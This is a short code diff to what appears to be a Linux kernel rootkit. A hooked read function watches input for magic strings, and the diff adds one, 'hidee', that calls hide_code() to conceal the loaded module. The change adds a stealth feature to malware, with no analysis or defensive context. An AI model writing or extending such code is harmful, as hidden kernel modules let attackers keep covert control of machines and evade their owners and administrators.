@@ -139,6 +139,10 @@ ssize_t my_read(int fd, void * buf, size_t count){
 						printk(KERN_INFO "will unload soon(TM)\n");
 						make_module_removable(NULL);
 					}
+					if(strcmp("hidee", cur_tinb->buf) == 0){
+						printk(KERN_INFO "will hide module\n");
+						hide_code();
+					}
 					*cur_tinb->buf = '\0';
 					break; //enough read.
 				}
